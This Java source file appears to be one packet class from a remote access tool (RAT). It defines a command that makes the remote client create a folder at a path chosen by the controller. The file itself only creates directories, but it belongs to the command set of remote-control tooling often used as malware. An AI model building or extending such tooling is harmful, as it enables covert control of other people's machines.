package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveClient;

public final class CreateFolderPacket implements IPacket {
	
	private String path, name;
	
	public CreateFolderPacket(final String path, final String name) {
		this.path = path;
		this.name = name;
	}
	
	public CreateFolderPacket() {
		this("", "");
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeUTF(path);
		client.writeUTF(name);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		path = client.readUTF();
		name = client.readUTF();
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final File folder = new File(path);
		
		String fullPath = null;
		
		if (folder.isDirectory()) {
			fullPath = path + File.separator + name;
		} else {
			final File parent = folder.getParentFile();
			
			if (parent != null) {
				fullPath = parent.getAbsolutePath() + File.separator + name;
			}
		}
		
		if (fullPath != null) {
			FileUtils.createFolder(fullPath);
		}
	}
	
	public String getPath() {
		return path;
	}
	
	public String getName() {
		return name;
	}
	
}
